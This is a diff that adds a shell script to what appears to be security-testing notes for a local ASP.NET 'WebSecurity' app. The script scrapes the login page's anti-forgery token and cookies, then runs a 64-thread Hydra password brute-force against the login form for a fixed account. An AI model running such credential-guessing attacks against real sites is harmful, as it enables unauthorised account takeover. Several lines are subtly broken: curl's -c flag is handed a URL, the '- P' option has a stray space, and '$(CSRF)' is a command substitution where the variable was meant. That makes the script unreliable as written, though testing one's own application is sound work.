@@ -1,1 +1,13 @@
 dependency-check.bat --project "Web Security" --scan "C:\Temp\WebSecurity\WebSecurity\WebSecurity\WebSecurity\bin"
+
+
+CSRF=$(curl -s -c "localhost/WebSecurity/Login" | awk -F 'value=' '/_RequestVerificationToken/ {print $2}' | cut -d '"' -f2)
+SESSIONID=$(grep \.AspNetCore\.Antiforgery WebSecurity.cookie | awk -F ' ' '{print $7}')
+SESSIONNAME=$(grep .AspNetCore.Antiforgery WebSecurity.cookie | awk -F ' ' '{print $6}')
+
+# HYDRA PROXY_HTTP="http://127.0.0.1:8080/"
+# export HYDRA_PROXY_HTTP
+
+hydra -l superuser@xyz.com - P /WebSecurity/passwords.txt \
+	-F -V -t 64 localhost http-post-form \
+	"/WebSecurity/Login:Input.Email=superuser@xyz.com&Input.Password=Abc@1234&_RequestVerificationToken=$(CSRF)&Input.RememberMe=false:S=Location\: /:H=Cookie: "
